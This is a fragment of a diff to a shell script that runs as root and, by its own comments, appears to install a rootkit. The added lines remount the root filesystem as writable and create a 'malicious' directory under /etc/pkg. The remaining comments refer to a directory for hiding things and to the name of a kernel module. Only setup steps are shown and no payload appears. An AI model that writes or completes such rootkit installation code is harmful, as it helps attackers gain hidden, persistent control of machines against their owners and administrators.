@@ -5,6 +5,8 @@ if [ $euid != 0 ]; then
    exit 1
 fi
 
+# make writable
+mount -o rw /
 # make maliocus directory
 mkdir /etc/pkg/config-backup
 # define new directory to hide things in and LKM name
